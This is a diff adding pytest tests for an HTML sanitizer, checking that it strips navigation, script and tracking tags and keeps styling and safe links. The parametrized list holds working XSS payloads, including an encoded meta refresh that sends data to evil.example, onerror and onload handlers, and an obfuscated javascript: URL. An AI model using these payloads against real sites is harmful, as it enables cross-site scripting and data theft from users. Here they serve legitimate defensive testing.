@@ -245,3 +245,40 @@ def test_html_sanitizer_keeps_body_text_and_catches_slash_handlers() -> None:
     assert "Set online = true today" in out
     assert "onerror" not in out.lower()
     assert "javascript:" not in out.lower()
+
+
+@pytest.mark.parametrize("payload", [
+    '<meta http-equiv="re&#102;resh" content="0;url=https://evil.example/?d=S">',
+    '<meta content="0;url=https://evil.example/?a>b" http-equiv="refresh">',
+    '<img src="x"onerror=alert(1)>',
+    '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">x</iframe>',
+    '<svg><set attributeName="onload" to="alert(1)"/></svg>',
+    '<a href="java&#115;cript:alert(1)">x</a>',
+    '<object data="https://evil.example/o">x</object>',
+    '<base href="https://evil.example/">',
+    '<link rel="stylesheet" href="https://evil.example/c.css">',
+    '<img src="https://evil.example/pixel.png">',
+    '<form action="https://evil.example/"><button>Go</button></form>',
+    '<style>a{}</style ><script>alert(1)</script>',
+])
+def test_html_sanitizer_blocks_navigation_and_script(payload: str) -> None:
+    out = af.sanitize_html(payload).lower()
+    for bad in ("evil.example", "refresh", "onerror", "onload", "javascript",
+                "srcdoc", "<script", "<iframe", "<object", "<base", "<meta",
+                "<link", "<form", "<set", "alert("):
+        assert bad not in out, (bad, out)
+
+
+def test_html_sanitizer_keeps_styling_and_forces_links_to_new_tab() -> None:
+    out = af.sanitize_html(
+        '<style>h1 > span { color: red }</style><h1 style="color:blue">A &amp; B</h1>'
+        '<a href="https://ok.example/x" target="_self">ok</a><a href="#s">jump</a>'
+        '<img src="data:image/png;base64,AAAA"><svg><rect width="4" height="2"/></svg>'
+    )
+    assert "<style>h1 > span { color: red }</style>" in out
+    assert '<h1 style="color:blue">A &amp; B</h1>' in out
+    assert ('<a href="https://ok.example/x" target="_blank" '
+            'rel="noopener noreferrer nofollow">ok</a>') in out
+    assert '<a href="#s">jump</a>' in out
+    assert 'src="data:image/png;base64,AAAA"' in out
+    assert '<rect width="4" height="2" />' in out
